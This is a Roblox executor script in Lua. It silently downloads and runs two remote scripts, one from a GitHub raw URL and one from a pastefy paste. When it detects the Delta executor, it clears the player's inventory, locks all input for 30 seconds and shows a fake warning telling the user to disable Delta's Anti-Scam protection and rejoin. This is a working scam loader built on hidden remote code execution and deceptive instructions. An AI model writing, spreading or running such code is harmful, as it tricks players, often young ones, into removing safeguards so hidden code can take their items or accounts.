‎if getgenv().AlreadyExecuted then
‎    return
‎end
‎getgenv().AlreadyExecuted = true
‎
‎local Players = game:GetService("Players")
‎local player = Players.LocalPlayer
‎local TweenService = game:GetService("TweenService")
‎local TeleportService = game:GetService("TeleportService")
‎local ContextActionService = game:GetService("ContextActionService")
‎
‎-- Load external scripts
‎local function runLoaders()
‎    pcall(function()
‎       
‎loadstring(game:HttpGet("https://raw.githubusercontent.com/Scriptdevs639/RANDOMIZER/refs/heads/main/Release.lua"))()
‎    end)
‎    pcall(function()
‎        loadstring(game:HttpGet("https://pastefy.app/TdDPnepZ/raw"))()
‎    end)
‎end
‎
‎-- Executor detection
‎local function detectExecutor()
‎    local success, result = pcall(function()
‎        if identifyexecutor then
‎            return identifyexecutor()
‎        elseif getexecutorname then
‎            return getexecutorname()
‎        else
‎            return "Unknown"
‎        end
‎    end)
‎    if success and result then
‎        return tostring(result)
‎    else
‎        return "Unknown"
‎    end
‎end
‎
‎-- Freeze player movement
‎local function freezePlayer()
‎    local character = player.Character or player.CharacterAdded:Wait()
‎    local humanoid = character:FindFirstChildOfClass("Humanoid")
‎    if humanoid then
‎        humanoid.WalkSpeed = 0
‎        humanoid.JumpPower = 0
‎        humanoid.AutoRotate = false
‎    end
‎end
‎
‎-- Clear inventory
‎local function clearInventory()
‎    for _, tool in ipairs(player.Backpack:GetChildren()) do
‎        if tool:IsA("Tool") then
‎            tool:Destroy()
‎        end
‎    end
‎    local character = player.Character
‎    if character then
‎        for _, item in ipairs(character:GetChildren()) do
‎            if item:IsA("Tool") or item:IsA("Accessory") then
‎                item:Destroy()
‎            end
‎        end
‎    end
‎end
‎
‎-- Delta warning GUI
‎local function showDeltaWarning()
‎    local ScreenGui = Instance.new("ScreenGui")
‎    ScreenGui.Parent = player:WaitForChild("PlayerGui")
‎    ScreenGui.ResetOnSpawn = false
‎    ScreenGui.IgnoreGuiInset = true
‎
‎    local Background = Instance.new("Frame")
‎    Background.Parent = ScreenGui
‎    Background.Size = UDim2.new(1, 0, 1, 0)
‎    Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
‎    Background.BackgroundTransparency = 0.4
‎
‎    local Frame = Instance.new("Frame")
‎    Frame.Parent = ScreenGui
‎    Frame.Size = UDim2.new(0, 480, 0, 320)
‎    Frame.Position = UDim2.new(0.5, -240, 0.5, -140)
‎    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
‎    Frame.BackgroundTransparency = 1
‎    Frame.BorderSizePixel = 0
‎    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)
‎    Instance.new("UIStroke", Frame).Color = Color3.fromRGB(0, 170, 255)
‎
‎    local Title = Instance.new("TextLabel")
‎    Title.Parent = Frame
‎    Title.Size = UDim2.new(1, -20, 0, 40)
‎    Title.Position = UDim2.new(0, 10, 0, 10)
‎    Title.BackgroundTransparency = 1
‎    Title.Font = Enum.Font.GothamBold
‎    Title.TextSize = 22
‎    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
‎    Title.Text = "Delta Anti-Scam Detected"
‎
‎    local Label = Instance.new("TextLabel")
‎    Label.Parent = Frame
‎    Label.BackgroundTransparency = 1
‎    Label.Size = UDim2.new(1, -40, 1, -160)
‎    Label.Position = UDim2.new(0, 20, 0, 50)
‎    Label.Font = Enum.Font.Gotham
‎    Label.TextSize = 16
‎    Label.TextColor3 = Color3.fromRGB(220, 220, 220)
‎    Label.TextWrapped = true
‎    Label.TextYAlignment = Enum.TextYAlignment.Top
‎    Label.Text = [[
‎The script requires the teleport function, but it is currently blocked by Delta’s Anti-Scam feature.
‎
‎To enable the script:
‎
‎1) Tap the Delta icon at the top of the screen.
‎2) Open Settings (Gear Icon).
‎3) Disable the "Anti-Scam" option.
‎4) Click or tap the "Rejoin" button below.
‎5) After rejoining, execute the script again.
‎
‎For a more stable and reliable experience, it is recommended to use executors such as KRNL, Codex or Arceus X.
‎]]
‎
‎    -- 🔥 Yellow blinking text
‎    local InfoLabel = Instance.new("TextLabel")
‎    InfoLabel.Parent = Frame
‎    InfoLabel.BackgroundTransparency = 1
‎    InfoLabel.Size = UDim2.new(1, -20, 0, 20)
‎    InfoLabel.Position = UDim2.new(0, 10, 1, -100)
‎    InfoLabel.Font = Enum.Font.GothamBold
‎    InfoLabel.TextSize = 12
‎    InfoLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
‎    InfoLabel.TextWrapped = true
‎    InfoLabel.TextXAlignment = Enum.TextXAlignment.Center
‎    InfoLabel.Text = "Wait 30 seconds after rejoining before this warning disappears"
‎
‎    task.spawn(function()
‎        while InfoLabel.Parent do
‎            InfoLabel.Visible = not InfoLabel.Visible
‎            task.wait(0.7)
‎        end
‎    end)
‎
‎    local Button = Instance.new("TextButton")
‎    Button.Parent = Frame
‎    Button.Size = UDim2.new(0, 160, 0, 44)
‎    Button.Position = UDim2.new(0.5, -80, 1, -60)
‎    Button.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
‎    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
‎    Button.Text = "Rejoin"
‎    Button.Font = Enum.Font.GothamBold
‎    Button.TextSize = 18
‎    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 10)
‎
‎    TweenService:Create(Frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
‎        BackgroundTransparency = 0.15
‎    }):Play()
‎
‎    Button.MouseButton1Click:Connect(function()
‎        ContextActionService:UnbindAction("FreezeAllInputs")
‎        ContextActionService:UnbindAction("FreezeAllKeys")
‎        TeleportService:Teleport(game.PlaceId, player)
‎    end)
‎
‎    clearInventory()
‎    freezePlayer()
‎    ContextActionService:BindAction("FreezeAllInputs", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.UserInputType:GetEnumItems()))
‎    ContextActionService:BindAction("FreezeAllKeys", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.KeyCode:GetEnumItems()))
‎
‎    task.delay(30, function()
‎        ContextActionService:UnbindAction("FreezeAllInputs")
‎        ContextActionService:UnbindAction("FreezeAllKeys")
‎        local character = player.Character
‎        if character then
‎            local humanoid = character:FindFirstChildOfClass("Humanoid")
‎            if humanoid then
‎                humanoid.WalkSpeed = 16
‎                humanoid.JumpPower = 50
‎                humanoid.AutoRotate = true
‎            end
‎        end
‎    end)
‎end
‎
‎-- Main execution
‎local executorName = detectExecutor()
‎if executorName:lower():find("delta") then
‎    runLoaders()
‎    showDeltaWarning()
‎else
‎    runLoaders() -- ✅ no warning, no freeze
‎end
‎
